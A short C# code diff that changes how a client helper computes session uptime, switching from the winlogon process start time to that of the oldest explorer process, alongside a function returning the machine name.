@@ -13,26 +13,29 @@ namespace Pulsar.Client.Helper
         {
             try
             {
-                var proc = System.Diagnostics.Process.GetProcessesByName("winlogon").FirstOrDefault();
-                DateTime sessionStart;
+                var explorers = System.Diagnostics.Process.GetProcessesByName("explorer");
+                if (explorers.Length > 0)
+                {
+                    // Select the oldest explorer instance (earliest StartTime)
+                    var oldest = explorers.OrderBy(p => p.StartTime).First();
 
-                if (proc != null)
-                    sessionStart = proc.StartTime;
+                    DateTime sessionStart = oldest.StartTime;
+                    TimeSpan uptimeSpan = DateTime.Now - sessionStart;
+
+                    return $"{uptimeSpan.Days}d : {uptimeSpan.Hours}h : {uptimeSpan.Minutes}m : {uptimeSpan.Seconds}s";
+                }
                 else
-                    // Fallback to system uptime
-                    sessionStart = DateTime.Now - TimeSpan.FromMilliseconds(Environment.TickCount);
-
-                TimeSpan uptimeSpan = DateTime.Now - sessionStart;
-
-                return $"{uptimeSpan.Days}d : {uptimeSpan.Hours}h : {uptimeSpan.Minutes}m : {uptimeSpan.Seconds}s";
+                {
+                    return "Explorer not running";
+                }
             }
             catch
             {
-                // Fallback again if access denied or process info unavailable
                 TimeSpan uptimeSpan = TimeSpan.FromMilliseconds(Environment.TickCount);
                 return $"{uptimeSpan.Days}d : {uptimeSpan.Hours}h : {uptimeSpan.Minutes}m : {uptimeSpan.Seconds}s";
             }
         }
+
         public static string GetPcName()
         {
             return Environment.MachineName;
